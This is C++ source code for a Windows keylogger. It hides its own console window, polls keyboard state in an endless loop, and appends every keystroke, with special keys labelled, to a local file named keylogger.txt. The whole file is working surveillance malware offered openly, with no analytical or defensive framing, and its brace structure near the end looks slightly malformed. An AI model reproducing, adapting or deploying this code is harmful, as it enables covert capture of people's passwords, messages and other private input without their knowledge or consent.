#include<iostream>
#include<fstream>
#include<Windows.h>
#include<bits/stdc++.h>



//log file path
#define LOG_FILE "keylogger.txt"

using namespace std;
//Save data into log file 

void saveData(string data){
    fstream logFile;
    
    logFile.open(LOG_FILE, std::ios::app);
    logFile << data;
    logFile.close();
}

//key to string 

string keyToString(int key){
    string result;
    switch(key){
        case VK_SPACE:
            result = " ";
            break;
        case VK_SHIFT:
            result =  " [SHIFT] ";
            break;
        case VK_RETURN :
            result =  " [ENTER] ";
            break;
        case VK_BACK:
            result =  " [BACKSPACE] ";
            break;
        
        case VK_TAB:    
            result =  " [TAB] "; 
            break;  
        case VK_CONTROL:    
            result =  " [CTRL] ";
            break;
        case VK_DELETE: 
            result =  " [DEL] ";
            break;
        case VK_OEM_1:
            result =  " [;:] ";
            break;
        case VK_OEM_2:
            result =  " [/?] ";
            break;
        case VK_OEM_3:  
            result =  " [`~] ";
            break;
        case VK_OEM_4:
            result =  " [{] ";
            break;
        case VK_OEM_5:  
            result =  " [|] "; 
            break;        
        case VK_OEM_6:
            result =  " [}] ";
            break;
        case VK_OEM_7:
            result =  " ['\"] ";
            break;
        case VK_CAPITAL:
            result =  " [CAPSLOCK] ";
            break;
        case VK_ESCAPE:
            result =  " [ESC] ";
            break;
        default:
            result =  " [UNKNOWN] ";
            break;
         }
    return result;
    }

    int main(){

        int specialKeyArray[]={VK_ESCAPE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_CONTROL, VK_DELETE, VK_OEM_1, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7, VK_CAPITAL, VK_ESCAPE};


        string specialKeyChar;
        bool isSpecialKey;


        HWND hwnd = GetConsoleWindow();
        ShowWindow(hwnd, SW_HIDE);

        while(true){
            //check if any key is pressed
            for(int key = 8; key <= 190; key++){

                if(GetAsyncKeyState(key) == -32767){
                      isSpecialKey = find(begin(specialKeyArray), end(specialKeyArray), key) != end(specialKeyArray);
                    
                     if (isSpecialKey){
                        specialKeyChar = keyToString(key);
                        saveData(specialKeyChar);
                    }
                    else{
                        if(GetKeyState(VK_CAPITAL)){
                           saveData(string(1, (char)key));
                        }else{
                           saveData(string(1,(char)tolower(key)));
                        }
                         }
                                                 }
        
       
                                               }
    }
         return 0;
}
